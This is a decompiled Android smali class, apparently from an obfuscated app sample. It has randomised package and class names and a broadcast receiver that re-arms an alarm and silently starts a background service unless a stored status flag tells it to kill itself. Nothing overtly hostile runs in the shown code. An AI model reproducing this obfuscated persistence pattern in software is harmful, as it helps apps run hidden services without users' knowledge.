.class public Lmzmr/iiyma/ssrxp/Smovyaf;
.super Landroid/content/BroadcastReceiver;
.source "Smovyaf.java"


# instance fields
.field private alarm:Lmzmr/iiyma/ssrxp/Ggnzszron;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 8
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 4
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    const/4 v3, 0x0

    .line 14
    new-instance v2, Lmzmr/iiyma/ssrxp/Ggnzszron;

    invoke-direct {v2}, Lmzmr/iiyma/ssrxp/Ggnzszron;-><init>()V

    iput-object v2, p0, Lmzmr/iiyma/ssrxp/Smovyaf;->alarm:Lmzmr/iiyma/ssrxp/Ggnzszron;

    .line 15
    iget-object v2, p0, Lmzmr/iiyma/ssrxp/Smovyaf;->alarm:Lmzmr/iiyma/ssrxp/Ggnzszron;

    invoke-virtual {v2, p1}, Lmzmr/iiyma/ssrxp/Ggnzszron;->SetAlarm(Landroid/content/Context;)V

    .line 17
    const-string v2, "cocon"

    invoke-virtual {p1, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 19
    .local v0, "settings":Landroid/content/SharedPreferences;
    const-string v2, "status"

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v1

    .line 20
    .local v1, "status":I
    const/16 v2, 0x4d

    if-ne v1, v2, :cond_0

    .line 21
    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v2

    invoke-static {v2}, Landroid/os/Process;->killProcess(I)V

    .line 25
    :goto_0
    return-void

    .line 23
    :cond_0
    new-instance v2, Landroid/content/Intent;

    const-class v3, Lmzmr/iiyma/ssrxp/Jncsdpau;

    invoke-direct {v2, p1, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0
.end method
